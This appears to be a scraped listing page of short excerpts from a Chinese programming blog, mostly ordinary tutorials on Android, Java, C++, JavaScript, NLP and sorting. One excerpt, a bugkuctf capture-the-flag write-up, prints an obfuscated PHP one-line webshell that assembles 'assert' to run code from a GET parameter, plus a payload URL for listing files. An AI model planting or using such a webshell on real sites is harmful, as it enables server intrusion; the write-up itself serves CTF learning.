		#include&lt;iostream&gt; #include&lt;cstdio&gt; #include&lt;algorithm&gt; #include&lt;cstring&gt; #include&lt;cmath&gt; #include&lt;vector&gt; #include&lt;queue&gt; #include&lt;set&gt; #define mem(a,x) memset(a,x,sizeof(a)) #define s1(x) scanf("%d",&amp;x) #define s2(x,y) scanf("%d%d",&amp;x,&amp;y) #define s3(x,y,z) scanf("%d%d%d",&amp;x,&amp;y,&amp;z) #define s4(x,y,z,k) scanf("%d%d%d%d",&amp;x,&amp;y,&amp;z,&amp;k) #define ff(a,n) for(int i = 0 ; i &lt; n; i++) scanf("%d",a+i) #define ls 2*rt #define rs 2*rt+1 #define lson ls,L,mid #define rson rs,mid+1,R #define ll long long using namespace std; typedef pair&lt;int,int&gt; pii; //inline ll ask(int x){ll res=0;while(x)res+=c[x],x-=x&amp;(-x);return res;} //inline void add(int x,int d){while(x&lt;=n)c[x]+=d,x+=x&amp;(-x);} //int gcd(int a, int b) { return b == 0 ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3bea97eeafa3a13016463ef3fd31c307/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b2fc711c1aca5d81d2dcc8d27c6ba7e/" rel="bookmark">
			Android studio导出hprof到MAT工具流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 准备MAT工具： 工具地址 : https://www.eclipse.org/mat/
这里有两种方式：一是以插件的方式集合到eclipse中，二是直接下载MemoryAnalyzer（免安装）；
Android studio生成hprof文件： 对于生成hprof文件，Android studio 3.0之后的版本和3.0之前的版本可以说是完全不一样的，如果你使用过eclipse开发过Android，那就很容易知道的，这里就不详细介绍了。
这里以Android studio 3.0之后的版本来做说明。
点击如下按钮：
之后就会出现一个Android Profiler的控制面板，这里就是android studio给我们提供的内存分析的地方，关于Android Profiler的详细使用这里不做介绍，这里主要看MEMORY，点击如下红色区域：
接着就进入到了实时内存区域
上面三个标记按钮的作用：
1、内存回收；
2、堆转储，将此时堆内存中的对象记录导出到hprof文件中；
3、一段时间内堆内存中的分配记录，比如：点击开始，操作app，操作结束后，再次点击结束，这时就会生成一个记录了这段时间内堆中生成的对象。
这里要生成hprof文件，当然就是点击2了，之后就会出现一个堆记录面板，如下图：
在点击上面的红框按钮，就可以生成一个hprof的本地文件了，此时文件是生成了，如果这时就用MAT工具去打开，是会报错的，这时因为MAT是用来分析java文件的，与android studio导出的hprof文件有一点不同，这时就需要用到一个android sdk包下的一个工具hprof-conv.exe，将导出的hprof文件在进行转换一下，位置如下图：
接下来打开控制台，切换到hprof-conv.exe所在目录，执行：hprof-conv 源文件 输出文件，如下图：
这里的D:\album.hprof就是android studio导出的hprof文件，而D:\album1.hprof就是转换后的文件，这也是MAT可以打开的文件，这样整个流程就全部完成了，接下来要做的就是去分析了，这里先不做介绍，等待下一篇再来。
Android studio结合MAT分析hprof文件 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df67466f8028f363e74dca8fa60e6ffa/" rel="bookmark">
			DevExpress_常用控件24_GridControl_上
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2.3 GridControl 1、 如何解决 单击记录 整行选中 的问题 View-&gt;OptionsBehavior-&gt;EditorShowMode 设置为：Click
可选值：Default / MouseDown / MouseUp / Click
2、 如何新增一条记录 (1)、gridView.AddNewRow()
(2)、实现 gridView_InitNewRow 事件
3、如何解决 GridControl 记录 能获取 而 没有显示到界面上 的问题 gridView.populateColumns();
4、如何让行 只能选择 而不能编辑（或编辑某一单元格） (1)、View-&gt;OptionsBehavior-&gt;EditorShowMode 设置为：Click
(2)、View-&gt;OptionsBehavior-&gt;Editable 设置为：false
5、如何 禁用 GridControl 中 单击列 弹出右键菜单 设置 Run Design-&gt;OptionsMenu-&gt;EnableColumnMenu 设置为：false
6、如何 隐藏 GridControl 的 GroupPanel 表头 设置 Run Design-&gt;OptionsView-&gt;ShowGroupPanel 设置为：false
7、如何显示水平滚动条 a. 只需禁用宽度自动调整,自然就会出现水平滚动条
this.gridView.OptionsView.ColumnAutoWidth = false;
补充一句: ColumnAutoWidth 为true时,则表示: 各列的宽度自动调整
b. 列表宽度自适应内容
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/df67466f8028f363e74dca8fa60e6ffa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f767e3775752f9099e4ccff6c930376/" rel="bookmark">
			Java--Apache里面的BeanUtils组件使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		BeanUtils BeanUtils是Apache commens组件里面的成员，由Apache提供的一套开源api，用于简化对javaBean的操作，能够对基本类型自动转换。
JavaBean BeanUtils组件是用于简化javaBean的操作，那么什么是javaBean呢？简单来说，javaBean实质就是java类，只不过是遵循了某种规范的java类。
javaBean的特点：
必须具有一个无参的构造方法属性必须私有化私有化的属性必须通过public类型的方法来暴露，也就是说要出现setXXX()、getXXX()或者isXXX()的方法 下载BeanUtils http://commons.apache.org/proper/commons-beanutils/download_beanutils.cgi，下载好组件，再到项目里面引入jar文件。
导入核心包 commons-beanutils-1.9.3.jarcommons-logging-1.2.jar 注意：当缺少日志jar包，会出现如下的报错情况。java.lang.NoClassDefFoundError: org/apache/commons/logging/LogFactory
logging组件的下载地址：http://commons.apache.org/proper/commons-logging/download_logging.cgi javaBean实例 public class Student { private String name; private String id; private int age; private String sex; private Date d; public Student() { super(); } public Date getD() { return d; } public void setD(Date d) { this.d = d; } public String getName() { return name; } public void setName(String name) { this.name = name; } public String getId() { return id; } public void setId(String id) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4f767e3775752f9099e4ccff6c930376/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/703c903f17a548f6aec8ce76c6035b6d/" rel="bookmark">
			【C&#43;&#43;】VS2017 不能将const char * 分配给 char *实体
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 网上的指导方法是：
https://blog.csdn.net/weixin_37959984/article/details/82782984
我的方式是把结构体中定义的 char * 前面加上 "const"
示例及改正代码：
#include &lt;iostream&gt; using namespace std; class Student { public: //char *name;	//错误！！！ const char *name;	//需要在这里写上 const int age; float score; void say() { cout &lt;&lt; name &lt;&lt; "的年龄是" &lt;&lt; age &lt;&lt; "，成绩是" &lt;&lt; score &lt;&lt; endl; } }; int main() { Student *pStu = new Student; pStu-&gt;name = "小明"; pStu-&gt;age = 15; pStu-&gt;score = 92.5f; pStu-&gt;say(); delete pStu; //删除对象 getchar(); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4627509b5f8c55fd556799223d487a1e/" rel="bookmark">
			ionic3 导航 标题 title 透明处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		添加三个标签
1、no-border
2、transparent
3、fullscreen
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64e2b8d367b3264f7f2b68bb6fd57ae1/" rel="bookmark">
			window.open（）在谷歌浏览器不支持问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目需求：点击某个按钮弹出一个小窗
选取方法：window.open（） 具体文档可以查看w3c
遇到的问题
按照文档的参数进行设置了宽高，发现弹出的小窗并没有改变，检查了resizable=true是没有问题的，于是又在360浏览器打开，咦，发现小窗的宽和高是改变了的，所以，一定是浏览器的兼容性问题,经过查找资料得出了以下结论：
在谷歌浏览器中top,left,width,height同时设置，缺一不可，否则就不生效
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b1334ede45d908d373d7e7bc5888ef9/" rel="bookmark">
			原生ajax请求时出现xhr.status==0及POST请求无响应问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用原生ajax请求时发现xhr.status == 0，于是找了好久，竟然发现是绑定事件的元素不是我点击的元素。参考以下资源
AJAX问题之XMLHttpRequest status = 0
xhr.status状态码
1、If the state is UNSENT or OPENED, return 0.（如果状态是UNSENT或者OPENED，返回0）
2、If the error flag is set, return 0.（如果错误标签被设置，返回0）
3、Return the HTTP status code.（返回HTTP状态码）
POST请求无响应
POST请求函数如下：
function post(url, data){ var req = createXMLHTTPRequest(); if(req){ //post请求需要添加请求头，否则会报错 req.setRequestHeader("Content-type","application/x-www-form-urlencoded"); req.open("POST", url, true); //发送请求 req.onreadystatechange = function(){ //判断是否服务器响应 if(req.readyState == 4 &amp;&amp; req.status == 200) requestSuccess(); } req.send(data); } } 把req.setRequestHeader("Content-type","application/x-www-form-urlencoded");注释掉反而可以请求，而添加了这句就不可以，我怀疑是&lt;a&gt;标签不适用这种请求头，于是查了content-type的这种类型及说明：HTTP中application/x-www-form-urlencoded字符说明 还是没能解决问题。于是我仔细的对照网上的POST请求，发现应该先open,再setRequestHeader
req.open("POST", url, true); req.setRequestHeader("Content-type","application/x-www-form-urlencoded"); 参考：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7b1334ede45d908d373d7e7bc5888ef9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea3128ffd07a033de0e8d2ded37fda96/" rel="bookmark">
			【火炉炼AI】机器学习038-NLP创建词袋模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【火炉炼AI】机器学习038-NLP创建词袋模型 (本文所使用的Python库和版本号: Python 3.6, Numpy 1.14, scikit-learn 0.19, matplotlib 2.2， NLTK 3.3)
词袋模型（Bag Of Words, BOW)和词向量（Word Embedding, 也叫词嵌套等）是自然语言处理和文本分析的两个最常用的模型。
词袋模型将一段文本看成一系列单词的集合，由于单词很多，故而这段文本就相当于一个袋子，里面装着一系列单词。故而计算机的NLP分析就是对这个袋子进行分析，但是计算机不认识文本，只认识数字，那么我们需要一种机制将袋子里的文本转换成数字，这种机制可以是一种Dict映射（key为数字，value为文本等），或数组（索引为数字，值为文本），或者还可以用HashCode来计算文本的数字表示，而NLP建模就是使用这些数字来建模。词袋在学习之后，就可以通过构建文档中所有单词的直方图来对每篇文档进行建模。
词向量模型是将单个单词映射到一个高维空间（维度可以到几千几万甚至几十万），这个高维空间就用数组，或者成为向量来表示，故而建立一种单词-向量的映射关系，所以成为词向量模型。但是这种模型能表示的仅仅是单个单词，对于有多个单词组成的一句话，那么就需要做进一步处理，比如一个单词就是一个向量，Ｎ个单词组成的一句话就是Ｎ个一维向量了，故而可以用Ｎ个一维向量组成的矩阵来表示一句话，只不过不同长度的句子，该矩阵的行数不一样罢了。
下面我们仅仅学习用NLP创建词袋模型，创建过程主要是提取文本的特征，构建特征向量。有两种方法可以构建特征向量，分别是CountVectorizer和TfidfVectorizer。
1. 用CountVectorizer提取文本特征 sklearn模块中的CountVectorizer方法可以直接提取文本特征，这个函数只考虑词汇在文本中出现的频率，这个函数有一个参数：stop_words，表示是否取出停用词，所谓的停用词是指为了节省空间和提高效率而自动过滤到的词语，比如 the, is, at, which等，对于不同的，默认的stop_words不去除停用词。
# 数据集暂时用简·奥斯丁的《爱玛》中的文本 dataset=nltk.corpus.gutenberg.words('austen-emma.txt') # print(len(dataset)) # 192427 代表读入正常 chunks=split(" ".join(dataset[:10000]), 2000) # 将前面的10000个单词分成五个词袋，每个袋子装2000个单词 # 构建一个文档-词矩阵，该矩阵记录了文档中每个单词出现的频次 # 用sk-learn的CountVectorizer函数来实现这种构建过程 from sklearn.feature_extraction.text import CountVectorizer vectorizer = CountVectorizer(min_df=4, max_df=.99) # fit_transform函数需要输入一维数组，且数组元素是用空格连起来的文本 chunks=[" ".join(chunk) for chunk in chunks] # 故而需要转换一下 doc_term_matrix = vectorizer.fit_transform(chunks) feature_names=vectorizer.get_feature_names() # 获取 print(len(feature_names)) print(doc_term_matrix.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea3128ffd07a033de0e8d2ded37fda96/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4a2297a304466d3a427aa2392ca2e62f/" rel="bookmark">
			bootstrap栅格布局五等分/八等分（参考Bootstrap的栅格写法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		五等分：
&lt;style type="text/css"&gt; .col-xs-1-5, .col-sm-1-5, .col-md-1-5, .col-lg-1-5 { position: relative; min-height: 1px; margin-right: 10px; margin-left: 10px; } .col-xs-1-5 { width: 18%; float: left; } @media (min-width: 768px) { .col-sm-1-5 { width: 18%; float: left; } } @media (min-width: 992px) { .col-md-1-5 { width: 18%; float: left; } } @media (min-width: 1200px) { .col-lg-1-5 { width: 18%; float: left; } } &lt;/style&gt; 八等分：
&lt;style type="text/css"&gt; .col-xs-1-8, .col-sm-1-8, .col-md-1-8, .col-lg-1-8 { min-height: 1px; padding-left: 15px; padding-right: 15px; position: relative; } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4a2297a304466d3a427aa2392ca2e62f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea747ada013191d1cc933ba7ae6815a6/" rel="bookmark">
			OpenCV（二）——LUT颜色空间缩减
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		LUT是look up table的缩写，中文解释：显示查找表，实际意义很简单易懂。
举个例子，如果是单通道的图像，灰度梯度是0~255，即分为256级。
你可以设置对应灰度转化成你设置成的灰度
table[256]; table[0] = 2; table[1] = 5; 像上图就是把原灰度0的值变成2，灰度1变为5。
展示下如何使用LUT进行图像压缩。
#include &lt;opencv2/opencv.hpp&gt; using namespace cv; int main() { Mat image = imread("lena.png",IMREAD_GRAYSCALE); Mat lookUpTable(1, 256, CV_8U); uchar table[256]; int divideWith = 20; //压缩级 20灰度为1级 for(int i = 0; i &lt; 256; ++i) table[i] = divideWith * (i / divideWith); Mat dst; uchar *p = lookUpTable.data; for(int i = 0; i &lt; 256; ++i) { p[i] = table[i]; } for(int i = 0; i &lt; 256; i++) { LUT(image,lookUpTable, dst); } imshow("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea747ada013191d1cc933ba7ae6815a6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5a1e12617d0b6582a80b5008c11f59fe/" rel="bookmark">
			2018年CSDN博客排名第一名，花落谁家？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		截止2018年10月9日
https://blog.csdn.net/stpeace/
【小虎问题】： 通过搜索引擎例如：百度、搜狗、Bing等
如何快速搜索，定位谁是CSDN博客的第几名？ 想知道谁CSDN博客第几名，搜索一下，即可知道。 欢迎大家踊跃留言作答。谢谢！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09849dd2548bb98649e8d2c78f487043/" rel="bookmark">
			LoadRunner如何通过脚本来判断事物通过还是失败
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		loadrunner性能测试的时候经常用到事物，通过事物来判断服务器性能，如何才能知道事物是通过的呢？
事物通过和失败的函数分别如下：
lr_end_transaction("事物", LR_PASS); //通过 lr_end_transaction("事物", LR_FAIL); //失败 lr_end_transaction("事物", LR_AUTO); //自动识别通过还是失败 要判断必然会出现判断语法，loadrunner里采用c语言的语法，所以其代码可以这样写
if (表达式) { lr_end_transaction("事物", LR_PASS); } else{ lr_end_transaction("事物", LR_FAIL); } 接下来的这一步是比较重要的，表达式是什么，我们应该如何去判断事物通过。这里我们使用到一个函数
//根据左右边界截取整个返回值，存在变量result中 web_reg_save_param("result", "LB={", "RB=}", "Search=Body", LAST); 每一个接口都会有返回值，返回头或者返回的body都可以作为search的范围，这里取Body。返回的结果中如果有“操作成功”则事物通过。我们可以打印出来在后台看，注意这里面返回值带中文需要做特殊处理
/返回值有中文，需要转码，转码后的值存在了msg中 lr_convert_string_encoding(lr_eval_string("{result}"),"utf-8",NULL,"outmsg"); //打印返回值 lr_output_message("转换编码后outmsg----%s",lr_eval_string("{outmsg}")); n=strlen(lr_eval_string("{outmsg}")); lr_output_message("%d",n); 这里偷了一下懒，字符截取比较麻烦，所以直接通过返回的字符长度来判断事物是否通过。
全部代码如下：
//根据左右边界截取整个返回值，存在变量result中 web_reg_save_param("result", "LB={", "RB=}", "Search=Body", LAST); //访问事物的接口 lr_start_transaction("事物"); web_submit_data("web_submit_data", "Action=https://www.baidu.hhh.com/api/agggnee/relwulncy/getContactPhoneInfo", "Method=POST", "TargetFrame=", "RecContentType=application/json", "Referer=", ITEMDATA, "Name=caseManageId", "Value={caseManageId}", ENDITEM, LAST); //返回值有中文，需要转码，转码后的值存在了msg中 lr_convert_string_encoding(lr_eval_string("{result}"),"utf-8",NULL,"outmsg"); //打印返回值 lr_output_message("转换编码后outmsg----%s",lr_eval_string("{outmsg}")); n=strlen(lr_eval_string("{outmsg}")); lr_output_message("%d",n); if (n==37) { lr_end_transaction("事物", LR_PASS); } else{ lr_end_transaction("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/09849dd2548bb98649e8d2c78f487043/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/125dedfbaf6e505c0bb753c6831072d3/" rel="bookmark">
			ICCV 2017 paper
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考链接 ICCV 2017 open access Paperlist Globally-Optimal Inlier Set Maximisation for Simultaneous Camera Pose and Feature Correspondence
Robust Pseudo Random Fields for Light-Field Stereo Matching
A Lightweight Approach for On-The-Fly Reflectance Estimation
Distributed Very Large Scale Bundle Adjustment by Global Camera Consensus
Practical Projective Structure From Motion (P2SfM)
Anticipating Daily Intention Using On-Wrist Motion Triggered Sensing
Rethinking Reprojection: Closing the Loop for Pose-Aware Shape Reconstruction From a Single Image
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/125dedfbaf6e505c0bb753c6831072d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6ed410c0141302d05eec8ac35f9c72a/" rel="bookmark">
			Nosql 学生信息管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		弄了几天，终于是把这个项目码完了，来写下总结，也顺便吐槽一下。
首先，你得自己先写一个测试项目，去搞懂java与mongodb的连接，以及增删查改的写法。当然这里我没有用框架去进行增删查改，原因后面讲。其次，你就可以对项目就行添加数据库的一切功能。
相关的知识、源码、解析，请去查看我JAVA分类下的博客。
注意：
在用JSON配合EASYUI自动画表时，JSON中的参数不能传NULL值，否则无法正常显示。如：{no:"",name:"asmn"}这里no就给了空值。
截图：
APP、软件、网站开发可以在下方评论处留言
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/12006234a8deaa421a733ffcad48b7ec/" rel="bookmark">
			常见的排序,查找算法,以及常见的数据结构如链表,二叉树等的实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		GitHub更新的较这里勤,这里只做日志更新 囊括常见的排序算法,数据结构的实现,具体的代码会有Go也会有Java每个算法和数据结构都有对应的测试模块,Java在test下,Go则直接同级目录下对于为null或者数组长度为0的特殊情况默认不校验 更新日志 2019-01-17
23:42 修改了CompleteTree的讲解,干脆一直将节点认为是从0开始,而非从1,开始,也就是说左孩子的节点下标为:2index+1,右孩子:2index+2,而临界值变为了arr.length-1添加了堆排序已经部分讲解,也添加了TODO(复杂度之类的,还有非递归实现,以及测试用例需要补全) 2019-01-18
09:32 添加了堆排序中非递归建堆的部分(简单来说就是通过动态改值)一些TODO也添加了(复杂度解析之类的) 2019-01-20
10:09 今天的话添加了普通版的快速排序,三值版的可能会晚上添加,昨天的话将海量数据的测试数据
预加载好了(总共500w) 11:42 添加了map遍历的4种方式(通过key遍历value,直接遍历value,通过entrySet.iterator遍历所有的key和value,通过entrySet直接遍历所有的key和value) 15:19
添加了ArrayList的简单实现,参考价值不大16:08 添加了通过2个栈实现一个队列,简单点说就是2个栈,恒定往一个栈A中传递数据,pop的时候栈B将push的栈A中的数据全部push到这个栈B中,
然后栈B出队,这样先进后出的值变成了先进先出(a-&gt;b-&gt;c 入栈A,出栈:c-&gt;b-&gt;a到栈B中,a就变成了相当于后进的了) 16:55 添加了原生栈的简单实现,与list相同,参考意义不大 18:04 添加了通过2个队列实现一个栈的功能,简单点说就是2个队列,2个队列中保持着一个为空,另一个非空 01-21
12:20 添加了单链表的实现(只有root节点的链表),注意点的话就是删除的时候要先获取他的前驱节点,指向这个节点的后继节点 14:28 添加了单向循环链表(有tail和head指针,tail的下一级指向头指针)的实现,在循环链表中next是不可能为空的,在删除操作
时候需要判断这个节点是否是尾部节点,要捕获前驱节点(意味着需要遍历),然后重新移动尾部节点和下一个节点的指向 18:19 添加了hash冲突问题解决方案中的开放地址之线性探测法,remove未写,测试用例也未写 01-24
23:51 添加了时间轮算法的简单实现V1,但是测试的时候ide总是提示 !!! JUnit version 3.8 or later expected:
啥鬼玩意,头疼,明天看会不会有空,有空的话解决,然后完善下方案,bug有点多的 01-26
15:36 添加了非递归遍历二叉树的先序和中序版本 21:00 添加了非递归遍历二叉树后序遍历添加了非递归遍历二叉树后序遍历 01-27
10:53 添加了go版的线程池的简易实现,二级队列保存每个worker的工作池来实现 01-27
14:51
添加了jdk动态代理的形式 17:00
添加了基于cglib动态代理的形式 01-28
15:42 添加了二叉查找树的插入和删除操作,在src/main/go/structre/tree/binary_search_tree下,并且已经补全了测试用例,null的默认跳过 01-29
15:17 添加了解决hash冲突的另外一种方法:链地址法,其实就是实现一个HashMap,实现HashMap的难点在于红黑树部分,以及扩容部分,未实现 16:36 添加了hashSet,其实也是Map,底层是通过map实现的 01-30
11:21 添加了双向循环链表的实现添加了测试用例测试用例不会测试性能,只是为了证明思路是正确的 13:59 添加了通过快慢指针判断链表是否有环的方法添加了获取回环的节点的方法(注意一点就是快慢指针同步率的时候,快慢节点的起始位置是同一位置,否则若初始化的时候快节点就快了一步,则重新同步的时候快节点也需要先快一步) 02-01
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/12006234a8deaa421a733ffcad48b7ec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a75a526d1171948b85cbd823bed8ad10/" rel="bookmark">
			报错Required String parameter &#39;productId&#39; is not present的原因及处理办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果你遇到改错时,很快能也是你的方法中设置了形参,但是在访问该方法时,你却没有传参,所以你就看到了如下错误
Whitelabel Error Page This application has no explicit mapping for /error, so you are seeing this as a fallback.
Wed Oct 03 18:51:07 CST 2018
There was an unexpected error (type=Bad Request, status=400).
Required String parameter 'productId' is not present
但是在实际开发中,我们就是需要这种操作,比如说我们把新增和修改商品放在一个页面去做,新增时我们是不需要传商品id的,那我们如何解决这个问题你呢? 如图所示,这样就能解决这个问题啦!
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/254af334d9754f06918b94a5dc92caec/" rel="bookmark">
			Java 自定义接口类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		自定义接口类，可以理解为声明方法类
public interface Tools(){ public void Method(Object o); } 自定义实现类，实现接口类中声明的方法的算法
public class ToolsImp(){ public void Method(Object o){ System.out.println(o); } } private Tools tools; public static void main(String[] s){ tools.Method("asd"); } 需要注意的是，接口中的方法不能用静态，因为接口是抽象类，而静态是一定实现，即写成这样是错的public static void Method(Object o);
APP、软件、网站开发可以在下方评论处留言
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b3fcc62b2d3890a46657b80959e307cd/" rel="bookmark">
			【bugkuctf】过狗一句话 writeup
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		过狗一句话
&lt;?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt;
用assert执行任意代码 payload：http://120.24.86.145:8010/?s=print_r(scandir('./')); 扫描目录 目录下存在f14g.txt即为flag：BUGKU{bugku_web_009801_a}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/014286bf5ea89569d3e11aa088561e0d/" rel="bookmark">
			向量旋转公式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在二维坐标系中，一个位置向量的旋转公式可以由三角函数的几何意义推出。
比如上图所示是位置向量R逆时针旋转角度B前后的情况。
在左图中，我们有关系：
x0 = |R| * cosA =&gt; cosA = x0 / |R|
y0 = |R| * sinA =&gt; sinA = y0 / |R|
在右图中，我们有关系：
x1 = |R| * cos（A+B）
y1 = |R| * sin（A+B）
其中（x1， y1）就是（x0， y0）旋转角B后得到的点，也就是位置向量R最后指向的点。我们展开cos（A+B）和sin（A+B），得到：
x1 = |R| * （cosAcosB - sinAsinB）
y1 = |R| * （sinAcosB + cosAsinB）
现在把 cosA = x0 / |R| 和 sinA = y0 / |R| 代入上面的式子，得到：
x1 = |R| *（x0 * cosB / |R| - y0 * sinB / |R|）=&gt; x1 = x0 * cosB - y0 * sinB
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/014286bf5ea89569d3e11aa088561e0d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/206da9f4d177aa5d1bcf41f5eb86f7b9/" rel="bookmark">
			ios11手机屏幕投屏到电脑，利用苹果镜像功能，秒会！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		自从iOS11系统发布，苹果用户可以发现控制面板做了很大的调整，但是由于各方面的原因，很多人会出现投屏失败的情况，这是经常会遇到的问题，那当遇到类似投屏不成功的问题时，需要怎么办呢？iOS11手机屏幕怎么投屏到电脑呢？
方法/步骤：
1、拿好你的iPhone，接下来是傻瓜式投屏教程，纯小白操作步骤，不教都会；
2、电脑中安装第三方投屏软件——迅捷苹果录屏精灵，目前很多软件已和AirPlay完成适配，知道是什么投屏工具之后，就简单多了；
3、连接你的iPhone和电脑，实现镜像投屏，步骤也是异常简单，电脑端投屏软件会提示怎么连接手机和电脑哦！
4、打开iPhone镜像投屏AirPlay，会出现电脑同款投屏软件的名称哦！这时候知道怎么做了吧!
5、等待一会，镜像连接成功，电脑上的画面就会和手机端同步哦！可以通过投屏实现大屏体验，包括游戏投屏到电脑上视觉更好哦！
以上是iOS11手机屏幕怎么投屏到电脑的方法，希望对于iPhone用户的有帮助的，关于安卓系统的投屏，还会再说的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e541bdf812db1ff7033396f8cce3c63/" rel="bookmark">
			golang: 使用 sort 来排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		golang sort package: https://golang.org/src/sort
sort 操作的对象通常是一个 slice，需要满足三个基本的接口，并且能够使用整数来索引
// A type, typically a collection, that satisfies sort.Interface can be // sorted by the routines in this package. The methods require that the // elements of the collection be enumerated by an integer index. type Interface interface { // Len is the number of elements in the collection. Len() int // Less reports whether the element with // index i should sort before the element with index j.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e541bdf812db1ff7033396f8cce3c63/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c60e6035cda8e89acbb4448b383a718e/" rel="bookmark">
			js数组汉字排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 JS数组汉字排序 需求： 对汉字按照拼音首字母排序 最初思路：数组内容排序 sort -&gt; 字符串排序 sort((a,b)=&gt;a&lt;b)
（这需求还是很简单的么 ）（然而排序结果并不是想象的那样）
["吃","安","的","不"]
按照需求应该是abcd字母拼音排序
["安","不","吃","的",]
结果是
["的","安","吃","不"]
升级-&gt;出现汉字排序
最开始想法 使用字符串比对 : sort((a,b)=&gt;a&lt;b)
// 并不是我们想要的 拼音顺序 ["的","安","吃","不","d","b","a","=","-"," "] 解决：localeCompare() （兼容需考虑）
使用str1.localeCompare(str2);sort((a,b)=&gt;a.localeCompare(b))
// 拼音顺序 字符在前 汉字拼音顺序紧随 字母在后 [" ","-","=","安","不","吃","的","a","b","d"] var x=['-','=',' ','安','a','不','b','吃','d','的']; var s1=x.concat([]).sort((a,b)=&gt;a&lt;b); var s2=x.concat([]).sort((a,b)=&gt;a.localeCompare(b)); console.log(s1,s2) // 并不是我们想要的 拼音顺序 ["的","安","吃","不","d","b","a","=","-"," "] // 拼音顺序 字符在前 汉字拼音顺序紧随 字母在后 [" ","-","=","安","不","吃","的","a","b","d"] 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
